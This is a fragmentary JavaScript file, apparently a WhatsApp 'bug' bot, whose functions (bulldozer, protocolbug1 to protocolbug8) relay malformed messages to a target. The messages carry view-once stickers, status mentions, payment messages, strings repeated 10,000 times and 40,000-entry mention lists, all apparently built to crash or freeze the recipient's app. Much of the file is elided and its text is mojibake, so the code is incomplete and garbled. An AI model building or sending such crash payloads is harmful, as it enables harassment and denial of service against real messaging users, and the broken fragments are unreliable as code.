...
async function bulldozer(ask, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
...
async function protocolbug1(ask, target, mention) {
...
singleSelectReply: { selectedRowId: "馃寑" },
contextInfo: {
...
{
tag: "meta",
attrs: { is_status_mention: "馃寑 饾棩饾椂饾槆饾槄饾槂饾棽饾椆饾槆 - 饾棫饾椏饾棶饾榾饾椀 饾棧饾椏饾椉饾榿饾椉饾棸饾椉饾椆" },
content: undefined
}
]
}
...
async function protocolbug2(ask, target, mention) {
...
async function protocolbug3(ask, target, shibal) {
  ...
  await ask.relayMessage("status@broadcast", Rizxvelz.message, {
  ...
  if (shibal) {
    ...
    await ask.relayMessage(target, payment, kuntul);
  }
}

async function protocolbug8(ask, target, mention) {
    const mentionedList = [
    ...
    const embeddedMusic = {
        ...
        author: ".Rizxvelz Official" + "釤勧煗".repeat(10000),
        title: "Zoro",
...
async function protocolbug6(ask, target, mention) {
...
async function protocolbug7(ask, target, mention) {
  const mentionedJids = [
    ...Array.from({ length: 40000 }, () =>
